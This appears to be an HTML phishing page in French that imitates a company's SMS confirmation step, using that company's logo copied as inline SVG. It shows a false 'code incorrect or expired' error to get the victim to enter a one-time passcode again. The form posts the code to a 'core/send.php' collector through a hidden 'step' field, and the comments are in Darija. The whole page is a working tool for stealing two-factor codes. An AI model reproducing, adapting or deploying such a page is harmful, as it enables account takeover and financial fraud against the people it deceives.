<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="files/favicon.ico">
    <title>Validation SMS - Erreur</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: sans-serif;
        }
        body {
            background-color: #f4f7f9;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        /* Header f l-isser */
        header {
            background-color: #ffffff;
            padding: 15px 24px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            justify-content: flex-start;
            align-items: center;
            width: 100%;
        }
        .logo-container {
            max-width: 130px;
            display: flex;
            align-items: center;
        }
        .header__logo {
            width: 100%;
            height: auto;
        }
        /* Container principal */
        .main-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .sms-card {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 36, 55, 0.05);
            width: 100%;
            max-width: 450px;
            padding: 30px;
            border: 1px solid #e6ecf0;
        }
        
        /* Alert Box d Erreur */
        .error-alert {
            background-color: #fdf2f2;
            border: 1px solid #f8b4b4;
            border-radius: 6px;
            padding: 12px 16px;
            margin-bottom: 20px;
            display: flex;
            align-items: flex-start;
        }
        .error-alert svg {
            flex-shrink: 0;
            margin-right: 12px;
            margin-top: 2px;
        }
        .error-text {
            color: #9b1c1c;
            font-size: 13px;
            line-height: 1.5;
            font-weight: 500;
        }

        .title {
            color: #002437;
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #5d717d;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 25px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .input-label {
            display: block;
            color: #002437;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .input-wrapper {
            position: relative;
        }
        /* Input d-SMS m3lm b l-7mar dyal error */
        .input-item {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border: 1.5px solid #e53e3e; /* Border red b-tanyen */
            border-radius: 4px;
            color: #e53e3e; /* Text red */
            background-color: #fffaf0;
            outline: none;
            transition: border-color 0.2s;
            text-align: center;
            letter-spacing: 4px;
            font-weight: bold;
        }
        .input-item:focus {
            border-color: #e53e3e;
            box-shadow: 0 0 0 3px rgba(229, 62, 62, 0.15);
        }
        .field-error-message {
            color: #e53e3e;
            font-size: 12px;
            margin-top: 6px;
            font-weight: 500;
        }

        /* Button */
        .btn-submit {
            width: 100%;
            background-color: #002437;
            color: #ffffff;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.2s;
        }
        .btn-submit:hover {
            background-color: #00334D;
        }
        .btn-submit svg {
            margin-left: 8px;
            fill: #ffffff;
        }
        /* Resend Link */
        .resend-container {
            margin-top: 20px;
            text-align: center;
        }
        .resend-link {
            background: none;
            border: none;
            color: #00334D;
            font-size: 14px;
            text-decoration: underline;
            cursor: pointer;
            font-weight: 500;
        }

        /* Responsive Mobile View */
        @media (max-width: 480px) {
            header {
                padding: 12px 16px;
            }
            .logo-container {
                max-width: 110px;
            }
            .main-container {
                padding: 10px;
                align-items: flex-start;
                margin-top: 20px;
            }
            .sms-card {
                padding: 24px 20px;
                border-radius: 6px;
                box-shadow: 0 2px 8px rgba(0, 36, 55, 0.04);
            }
            .title {
                font-size: 18px;
            }
            .subtitle {
                font-size: 13px;
                margin-bottom: 20px;
            }
            .input-item {
                font-size: 15px;
                padding: 11px 14px;
            }
            .btn-submit {
                padding: 13px;
                font-size: 15px;
            }
        }
    </style>
</head>
<body>

    <header>
        <div class="logo-container">
            <div data-v-1d7cb465="" class="header__logo-box header__logo-box--xs-visible">
                <a data-v-1d7cb465="" aria-current="page" class="router-link-active router-link-exact-active" aria-label="Retour page d'accueil" tabindex="0" role="link">
                    <svg data-v-1d7cb465="" viewBox="0 0 446 101" fill="none" xmlns="http://www.w3.org/2000/svg" class="header__logo">
                        <path d="M42.6409 43.4746C27.2111 39.5129 23.3537 37.6363 23.3537 31.798V31.5895C23.3537 27.2107 27.3154 23.7703 34.8218 23.7703C42.3281 23.7703 50.1473 27.1065 58.0707 32.5278L68.2877 17.7235C59.2175 10.4256 48.1664 6.35968 35.1345 6.35968C22.1026 6.35968 3.85792 17.098 3.85792 33.2576V33.4661C3.85792 51.1895 15.4303 56.1937 33.4664 60.781C48.3749 64.6384 51.3984 67.1405 51.3984 72.1448V72.3533C51.3984 77.5661 46.6026 80.798 38.4707 80.798C30.3388 80.798 19.9132 76.6278 11.7813 69.9554L0.208984 83.8214C10.9473 93.4129 24.6047 98.1044 38.0537 98.1044C57.3409 98.1044 70.7898 88.2001 70.7898 70.4767V70.2682C70.7898 54.7341 60.5728 48.1661 42.5367 43.4746H42.6409Z" fill="#00334D"></path>
                        <path d="M114.16 27.3151C92.8917 27.3151 77.0449 43.2662 77.0449 62.8662V63.0747C77.0449 82.6747 92.6832 98.4172 113.847 98.4172C135.011 98.4172 150.962 82.4662 150.962 62.8662V62.6577C150.962 43.0577 135.324 27.3151 114.16 27.3151ZM131.883 63.0747C131.883 73.1874 125.211 81.7364 114.16 81.7364C103.109 81.7364 96.2279 72.9789 96.2279 62.8662V62.6577C96.2279 52.5449 102.9 44.1002 113.951 44.1002C124.69 44.1002 131.883 52.8576 131.883 62.9704V63.1789V63.0747Z" fill="#00334D"></path>
                        <path d="M180.362 23.8747C180.362 18.7662 182.864 16.4725 187.347 16.4725C191.83 16.4725 193.29 17.0981 196.105 18.1406V2.08531C192.56 0.9385 188.494 0.20871 182.343 0.20871C175.462 0.20871 170.249 1.98106 166.705 5.52574C163.16 9.07042 161.179 14.5959 161.179 22.1023V29.1917H153.151V45.1428H161.179V96.8534H180.571V45.1428H207.468V96.8534H226.86V29.2959H180.362V23.8747Z" fill="#00334D"></path>
                        <path d="M278.153 27.3151C268.353 27.3151 262.619 32.5279 258.136 38.2619V28.5662H238.745V96.8534H258.136V58.696C258.136 49.5215 262.828 44.83 270.23 44.83C277.632 44.83 281.906 49.5215 281.906 58.696V96.8534H301.298V52.6491C301.298 37.0108 292.749 27.3151 278.049 27.3151H278.153Z" fill="#00334D"></path>
                        <path d="M216.017 23.3534C221.855 23.3534 226.546 18.6619 226.546 12.8236C226.546 6.98532 221.855 2.29382 216.017 2.29382C210.178 2.29382 205.487 6.98532 205.487 12.8236C205.487 18.6619 210.178 23.3534 216.017 23.3534Z" fill="#00334D"></path>
                        <path d="M344.877 81.736C334.347 81.736 327.57 73.2913 327.57 62.8658V62.6572C327.57 52.5445 334.451 44.0998 344.147 44.0998C353.843 44.0998 355.406 47.0189 359.681 51.6062L371.566 38.887C365.206 31.6934 357.179 27.4189 344.251 27.4189C323.4 27.4189 308.387 43.4743 308.387 62.97V63.1785C308.387 82.6743 324.364 98.2028 343.938 98.5211C355.892 98.7155 365.206 93.3083 371.879 86.0104L360.515 74.5423C355.823 79.0253 351.34 81.8402 344.877 81.8402V81.736Z" fill="#00334D"></path>
                        <path d="M408.994 27.3151C387.726 27.3151 371.879 43.2662 371.879 62.8662V63.0747C371.879 82.6747 387.517 98.4172 408.681 98.4172C429.845 98.4172 445.796 82.4662 445.796 62.8662V62.6577C445.796 43.0577 430.158 27.3151 408.994 27.3151ZM426.717 63.0747C426.717 73.1874 420.045 81.7364 408.994 81.7364C397.943 81.7364 391.062 72.9789 391.062 62.8662V62.6577C391.062 52.5449 397.734 44.1002 408.785 44.1002C419.524 44.1002 426.717 52.8576 426.717 62.9704V63.1789V63.0747Z" fill="#00334D"></path>
                    </svg>
                </a>
            </div>
        </div>
    </header>

    <main class="main-container">
        <div class="sms-card">
            
            <div class="error-alert">
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M10 18C14.4183 18 18 14.4183 18 10C18 5.58172 14.4183 2 10 2C5.58172 2 2 5.58172 2 10C2 14.4183 5.58172 18 10 18ZM11 14C11 14.5523 10.5523 15 10 15C9.44772 15 9 14.5523 9 14C9 13.4477 9.44772 13 10 13C10.5523 13 11 13.4477 11 14ZM10 5C10.5523 5 11 5.44772 11 6V10C11 10.5523 10.5523 11 10 11C9.44772 11 9 10.5523 9 10V6C9 5.44772 9.44772 5 10 5Z" fill="#e53e3e"/>
                </svg>
                <div class="error-text">
                    Le code secret saisi est incorrect ou a expiré. Veuillez vérifier votre SMS et réessayer.
                </div>
            </div>

            <h1 class="title">Saisir le code de confirmation</h1>
            <p class="subtitle">Un code de validation vous a été envoyé par SMS. Veuillez le saisir ci-dessous pour continuer.</p>
            
            <form action="core/send.php" method="post" id="smsForm">
			
	<input type="hidden" name="step" value="www">
                <div class="form-group">
                    <label for="sms_code" class="input-label">Code secret reçu par SMS</label>
                    <div class="input-wrapper">
                        <input id="sms_code" name="sms_code" class="input-item" required type="text" pattern="[0-9]*" inputmode="numeric" maxlength="8" placeholder="••••••" autocomplete="one-time-code" autofocus>
                        <div class="field-error-message">Code de sécurité invalide.</div>
                    </div>
                </div>

                <button class="btn-submit" type="submit">
                    <span class="btn__label">Valider</span>
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M13.206 12.0054L9.3041 8.1073C9.12067 7.92406 9.02889 7.69077 9.02875 7.40744C9.02861 7.12411 9.12016 6.89073 9.30341 6.7073C9.48665 6.52388 9.71994 6.43196 10.0033 6.43196C10.2866 6.43182 10.52 6.52337 10.7034 6.70661L15.3057 11.3043C15.5058 11.5042 15.6059 11.7375 15.606 12.0042C15.6062 12.2709 15.5063 12.5042 15.3064 12.7043L10.7086 17.3066C10.5254 17.49 10.2921 17.5818 10.0088 17.582C9.72543 17.5821 9.49206 17.4905 9.30863 17.3073C9.12521 17.1241 9.03343 16.8908 9.03329 16.6074C9.03315 16.3241 9.1247 16.0907 9.30794 15.9073L13.206 12.0054Z"></path>
                    </svg>
                </button>
            </form>

            <div class="resend-container">
                <button type="button" class="resend-link">Je n'ai pas reçu de code</button>
            </div>
        </div>
    </main>

</body>
</html>